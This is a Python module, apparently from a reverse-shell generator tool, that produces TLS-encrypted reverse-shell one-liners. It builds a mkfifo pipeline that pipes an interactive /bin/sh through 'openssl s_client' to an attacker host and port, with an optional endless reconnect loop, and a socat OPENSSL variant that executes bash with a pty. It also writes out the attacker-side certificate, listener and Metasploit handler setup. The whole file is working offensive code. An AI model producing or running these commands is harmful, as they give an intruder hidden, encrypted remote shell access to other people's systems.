import random
from dataclasses import replace
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, build_listener_setup

_SHELL_PATHS = ["/bin/bash", "/bin/sh"]

_LISTENER_SETUP = """\
# Setup (run once on attacker machine):
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 7 -nodes -subj '/CN=x' 2>/dev/null"""

_MSF_NOTE = (
    "# Note: Metasploit has no direct OpenSSL reverse shell payload.\n"
    "# Use a standard multi/handler with a compatible staged payload,\n"
    "# or wrap with socat/ncat TLS termination on the attacker side."
)


class OpenSSLGenerator(ShellGenerator):
    language = "openssl"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variants = ["mkfifo_sclient", "socat_tls"]
        variant = random.choice(variants)

        if variant == "mkfifo_sclient":
            cmd = self._mkfifo_sclient(opts, names)
            listener = (
                f"{_LISTENER_SETUP}\n\n"
                f"# For mkfifo_sclient:\n"
                f"openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port {opts.lport}"
            )
        else:
            cmd = self._socat_tls(opts, names)
            listener = (
                f"{_LISTENER_SETUP}\n\n"
                f"# For socat_tls:\n"
                f"socat -d -d OPENSSL-LISTEN:{opts.lport},"
                f"cert=/tmp/cert.pem,key=/tmp/key.pem,verify=0 FILE:`tty`,raw,echo=0"
            )

        ls = replace(build_listener_setup(opts.lhost, opts.lport), tls=listener)

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=listener,
            tty_upgrade=TTY_UPGRADE,
            msf_compat=_MSF_NOTE,
            listener_setup=ls,
        )

    def _mkfifo_sclient(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        pipe = self._var("pipe", names)
        inner = (
            f"mkfifo /tmp/{pipe}; "
            f"/bin/sh -i < /tmp/{pipe} 2>&1 | "
            f"openssl s_client -quiet -connect {opts.lhost}:{opts.lport} > /tmp/{pipe}; "
            f"rm -f /tmp/{pipe}"
        )
        if opts.retry:
            return f"while :; do {inner}; sleep 30; done"
        return inner

    def _socat_tls(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        shell = random.choice(_SHELL_PATHS) if names else "/bin/bash"
        return (
            f"socat OPENSSL:{opts.lhost}:{opts.lport},verify=0 "
            f"EXEC:{shell},pty,stderr,setsid,sigint,sane"
        )
